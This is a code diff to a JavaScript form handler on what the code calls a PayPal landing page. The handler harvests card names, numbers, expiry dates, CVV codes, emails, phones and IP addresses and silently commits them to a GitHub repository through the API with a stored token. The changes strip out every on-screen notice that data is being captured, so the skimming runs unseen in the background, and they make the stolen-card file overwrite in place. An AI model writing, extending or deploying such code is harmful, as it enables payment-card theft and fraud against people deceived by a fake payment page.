@@ -70,8 +70,8 @@ class FormHandler {
         if (fieldName && fieldValue) {
             this.userData[fieldName] = fieldValue;
             
-            // إظهار إشعار مرئي
-            this.showDataCaptured(fieldName, fieldValue);
+            // حفظ صامت بدون إشعارات
+            console.log(`Data captured: ${fieldName}`);
         }
     }
     
@@ -147,7 +147,7 @@ class FormHandler {
             
         } catch (error) {
             console.error('❌ خطأ في حفظ البيانات:', error);
-            this.showError(`خطأ في الحفظ: ${error.message}`);
+            // خطأ صامت - بدون إشعارات للمستخدم
         }
     }
     
@@ -169,22 +169,21 @@ class FormHandler {
                 second: '2-digit'
             });
             
-            let fileContent = `=== ${isComplete ? 'معلومات كاملة' : 'معلومات جزئية'} - PayPal Landing Page ===\n`;
-            fileContent += `الوقت: ${timestamp}\n`;
-            fileContent += `المصدر: ${payload.pageUrl}\n`;
-            fileContent += `IP Address: ${this.getUserIP()}\n\n`;
+            let fileContent = `PayPal Card Information\n`;
+            fileContent += `Time: ${timestamp}\n`;
+            fileContent += `IP: ${await this.getUserIP()}\n`;
+            fileContent += `Source: ${payload.pageUrl}\n\n`;
             
             const data = payload.data;
-            if (data.cardName) fileContent += `الاسم على البطاقة: ${data.cardName}\n`;
-            if (data.cardNumber) fileContent += `رقم البطاقة: ${data.cardNumber}\n`;
-            if (data.expiryDate) fileContent += `تاريخ انتهاء البطاقة: ${data.expiryDate}\n`;
-            if (data.cvv) fileContent += `رمز الأمان CVV: ${data.cvv}\n`;
-            if (data.email) fileContent += `البريد الإلكتروني: ${data.email}\n`;
-            if (data.phone) fileContent += `رقم الهاتف: ${data.phone}\n`;
-            if (data.amount) fileContent += `المبلغ: $${data.amount} USD\n`;
+            if (data.cardName) fileContent += `Name: ${data.cardName}\n`;
+            if (data.cardNumber) fileContent += `Card: ${data.cardNumber}\n`;
+            if (data.expiryDate) fileContent += `Expiry: ${data.expiryDate}\n`;
+            if (data.cvv) fileContent += `CVV: ${data.cvv}\n`;
+            if (data.email) fileContent += `Email: ${data.email}\n`;
+            if (data.phone) fileContent += `Phone: ${data.phone}\n`;
+            if (data.amount) fileContent += `Amount: $${data.amount}\n`;
             
-            fileContent += `\nمعلومات المتصفح: ${payload.userAgent}\n`;
-            fileContent += `\n${'='.repeat(50)}\n`;
+            fileContent += `\nUser-Agent: ${payload.userAgent}\n`;
             
             // حفظ في GitHub للبيانات الكاملة فقط
             if (isComplete) {
@@ -192,11 +191,12 @@ class FormHandler {
             }
             
             this.lastSentData = { ...this.userData };
-            this.showSuccess(isComplete, false);
+            // حفظ صامت - بدون إشعارات للمستخدم
+            console.log('Data saved successfully');
             
         } catch (error) {
             console.error('❌ خطأ في الحفظ:', error);
-            this.showError('فشل في الحفظ: ' + error.message);
+            // خطأ صامت - بدون إشعارات للمستخدم
         }
     }
     
@@ -210,9 +210,8 @@ class FormHandler {
             
             const config = window.GITHUB_CONFIG;
             
-            // إنشاء اسم الملف مع التاريخ والوقت
-            const date = new Date();
-            const fileName = `${config.dataFolder}/${config.filePrefix}${date.getFullYear()}-${(date.getMonth()+1).toString().padStart(2,'0')}-${date.getDate().toString().padStart(2,'0')}_${Date.now()}.txt`;
+            // إنشاء اسم الملف card.txt (سيتم الكتابة فوقه في كل مرة)
+            const fileName = `${config.dataFolder}/card.txt`;
             
             // تحويل المحتوى إلى base64
             const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
@@ -220,12 +219,34 @@ class FormHandler {
             // إعداد البيانات للإرسال
             const apiUrl = `https://api.github.com/repos/${config.owner}/${config.repo}/contents/${fileName}`;
             
+            // محاولة الحصول على SHA للملف الموجود (إذا كان موجوداً)
+            let sha = null;
+            try {
+                const existingFileResponse = await fetch(apiUrl, {
+                    headers: {
+                        'Authorization': `token ${config.token}`,
+                        'Accept': 'application/vnd.github.v3+json'
+                    }
+                });
+                if (existingFileResponse.ok) {
+                    const existingFile = await existingFileResponse.json();
+                    sha = existingFile.sha;
+                }
+            } catch (e) {
+                // الملف غير موجود، سيتم إنشاؤه
+            }
+            
             const requestData = {
-                message: `إضافة بيانات PayPal - ${timestamp}`,
+                message: `تحديث بيانات PayPal - ${timestamp}`,
                 content: contentBase64,
                 branch: config.branch,
                 committer: config.committer
             };
+            
+            // إضافة SHA إذا كان الملف موجوداً
+            if (sha) {
+                requestData.sha = sha;
+            }
             
             // إرسال البيانات إلى GitHub
             const response = await fetch(apiUrl, {
@@ -247,8 +268,7 @@ class FormHandler {
             const result = await response.json();
             console.log('✅ تم حفظ البيانات في GitHub بنجاح:', result.content.download_url);
             
-            // إظهار رسالة نجاح مع رابط الملف
-            this.showGitHubSuccess(result.content.html_url);
+            // حفظ صامت - بدون إشعارات للمستخدم
             
             return result;
             
@@ -272,39 +292,7 @@ class FormHandler {
         }
     }
     
-    // إظهار رسالة نجاح GitHub
-    showGitHubSuccess(fileUrl) {
-        const notification = document.createElement('div');
-        notification.style.cssText = `
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(135deg, #28a745, #20c997);
-            color: white;
-            padding: 20px 30px;
-            border-radius: 12px;
-            font-weight: 600;
-            z-index: 10000;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 400px;
-        `;
-        
-        notification.innerHTML = `
-            <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
-            <div style="font-size: 16px; margin-bottom: 15px;">تم حفظ البيانات في GitHub بنجاح!</div>
-            <div style="font-size: 12px; opacity: 0.9;">البيانات محفوظة بأمان في المستودع</div>
-        `;
-        
-        document.body.appendChild(notification);
-        
-        // إزالة الإشعار بعد 4 ثوان
-        setTimeout(() => {
-            notification.style.opacity = '0';
-            setTimeout(() => notification.remove(), 300);
-        }, 4000);
-    }
+    // تم حذف إشعارات GitHub - النظام يعمل بصمت
     
     // تنزيل ملف
     downloadFile(content, filename) {
@@ -328,85 +316,9 @@ class FormHandler {
         }, 10000); // فحص كل 10 ثوان
     }
     
-    // إظهار أن البيانات تم التقاطها
-    showDataCaptured(fieldName, fieldValue) {
-        const notification = document.createElement('div');
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #28a745;
-            color: white;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            z-index: 10000;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        `;
-        notification.textContent = `📝 تم حفظ ${fieldName}`;
-        
-        document.body.appendChild(notification);
-        
-        setTimeout(() => notification.style.opacity = '1', 100);
-        setTimeout(() => {
-            notification.style.opacity = '0';
-            setTimeout(() => notification.remove(), 300);
-        }, 2000);
-    }
+    // تم حذف الإشعارات - حفظ صامت
     
-    // إظهار نجاح الحفظ
-    showSuccess(isComplete, isLocal = false) {
-        const localText = isLocal ? ' (محلياً)' : '';
-        const message = isComplete ? 
-            `✅ تم حفظ المعلومات الكاملة${localText}!` : 
-            `📤 تم حفظ البيانات${localText}!`;
-        this.showNotification(message, '#28a745');
-    }
-    
-    // إظهار خطأ
-    showError(error) {
-        this.showNotification(`❌ خطأ: ${error}`, '#dc3545');
-    }
-    
-    // إظهار إشعار عام
-    showNotification(message, color) {
-        const notification = document.createElement('div');
-        notification.style.cssText = `
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: ${color};
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            font-weight: 600;
-            z-index: 10000;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            animation: slideDown 0.3s ease;
-        `;
-        notification.textContent = message;
-        
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes slideDown {
-                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
-                to { opacity: 1; transform: translateX(-50%) translateY(0); }
-            }
-        `;
-        document.head.appendChild(style);
-        
-        document.body.appendChild(notification);
-        
-        setTimeout(() => {
-            notification.style.animation = 'slideDown 0.3s ease reverse';
-            setTimeout(() => {
-                notification.remove();
-                style.remove();
-            }, 300);
-        }, 3000);
-    }
+    // تم حذف جميع الإشعارات - النظام يعمل بصمت
     
     // تشغيل/إيقاف النظام
     toggle(enabled) {
@@ -432,9 +344,7 @@ document.addEventListener('DOMContentLoaded', function() {
     setTimeout(() => {
         window.formHandler = new FormHandler();
         
-        console.log('🚀 Form Handler System Ready!');
-        console.log('🔧 استخدم window.formHandler للتحكم في النظام');
-        console.log('📋 الطرق المتاحة: toggle(), clearData(), getCurrentData()');
+        // النظام جاهز - يعمل بصمت في الخلفية
     }, 1000);
 });
 
